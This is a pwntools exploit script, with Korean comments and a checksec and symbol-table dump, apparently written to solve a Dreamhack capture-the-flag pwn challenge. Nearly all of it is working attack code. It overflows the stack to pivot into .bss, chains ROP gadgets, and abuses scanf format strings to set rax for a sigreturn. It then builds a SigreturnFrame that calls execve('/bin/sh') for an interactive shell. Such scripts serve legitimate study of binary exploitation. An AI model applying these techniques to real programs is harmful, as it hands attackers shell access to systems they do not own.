'''
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No

                 w __gmon_start__
                 U __isoc99_scanf@GLIBC_2.7
                 U __libc_start_main@GLIBC_2.34
000000000040038c r __abi_tag
0000000000401000 T _init
0000000000401050 T _start
0000000000401080 T _dl_relocate_static_pie
0000000000401090 t deregister_tm_clones
00000000004010c0 t register_tm_clones
0000000000401100 t __do_global_dtors_aux
0000000000401130 t frame_dummy
0000000000401136 T main
000000000040116c T _fini
0000000000402000 R _IO_stdin_used
0000000000402008 r __GNU_EH_FRAME_HDR
00000000004020e0 r __FRAME_END__
0000000000403dd0 d __frame_dummy_init_array_entry
0000000000403dd8 d __do_global_dtors_aux_fini_array_entry
0000000000403de0 d _DYNAMIC
0000000000403fd0 d _GLOBAL_OFFSET_TABLE_
0000000000404000 D __data_start
0000000000404000 W data_start
0000000000404008 D __dso_handle
0000000000404010 D __TMC_END__
0000000000404010 B __bss_start
0000000000404010 D _edata
0000000000404010 b completed.0
0000000000404018 B _end

scanf()로 릭
'''

from pwn import *

context.arch = 'amd64'

#p = remote('127.0.0.1', 8080)
p = remote('host3.dreamhack.games', 17894)

ret = 0x000000000040101a # ret
main_addr = 0x0000000000401136 # main start
deregister_tm_clones = 0x0000000000401090 # rdi 인자 셋팅을 위한 가젯
_start_addr = 0x0000000000401050 # libc start main 주소를 BFA 하기 위해서 사용하는 주소
bss_start = 0x404010
pop_rbp = 0x000000000040111d # pop rbp ; ret
scanf_plt = 0x0000000000401040

print("bss 로 rbp 내리고 bss 에 ROP gadget 셋팅")
packet = b'A' * 0x100
packet += p64(bss_start+0x100 - 0x10) + p64(main_addr+0xf)
p.sendline(packet)

count = 8
#pause()
print("bss 에 값을 쓰는 패킷 전송")
packet = b'/bin/sh\0' +  b'\x00' * 0x8
packet += b'%7$s' + b'\x00' * 0xc
packet += p64(ret) * int( ( 0xf20 - (0x8 * count))/ 0x8)
packet += p64(_start_addr) + p64(0x0) * 22
packet += p64(0x0) * 6
packet += p64(0x404ea8) + p64(0x404ea9) # d8 에는 0xb4(45$) d9 에는 0xdd(46$)
p.sendline(packet)

print("_start 실행 이후, syscall sigreturn 전까지의 필요한 것 셋팅")
packet = p64(0x0) * int(0x100 / 0x8)
packet += p64(0x404e00) + p64(ret)

packet += p64(deregister_tm_clones) + p64(pop_rbp)
packet += p64(0x404e28) + p64(main_addr + 0x20)
packet += p64(pop_rbp) + p64(0x404eb0)

packet += p64(deregister_tm_clones) + p64(pop_rbp)
packet += p64(0x404a00 - 0x8) + p64(main_addr+0x20)
packet += p64(pop_rbp) + p64(0x404a00)

packet += p64(ret) * 2
packet += p64(ret) * 2
packet += p64(ret) * 2
packet += p64(scanf_plt)[:7]
p.sendline(packet)

print("sigreturn frame setting")
sf = SigreturnFrame()
sf.rdi = 0x404000
sf.rsi = 0
sf.rdx = 0
sf.rip = ret
sf.rax = 0x3b
sf.rsp = 0x404ea8
p.sendline(bytes(sf))

print("%c * 0xf 를 삽입하여 rax 를 0xf 로 셋팅하기 위한 가젯 셋팅")
packet = p64(deregister_tm_clones) + p64(pop_rbp)
packet += p64(0x404e90) + p64(main_addr + 0x20)
packet += p64(pop_rbp) + p64(0x4044e0)
p.sendline(packet)


print("%c * 0xf 를 삽입하는 전송")
packet = b'%45$c' * 0xe + b'%46$c' + b'\x00'
p.sendline(packet)

packet = b'\xb4'*0xd + b'\xdd'
p.sendline(packet)
p.interactive()
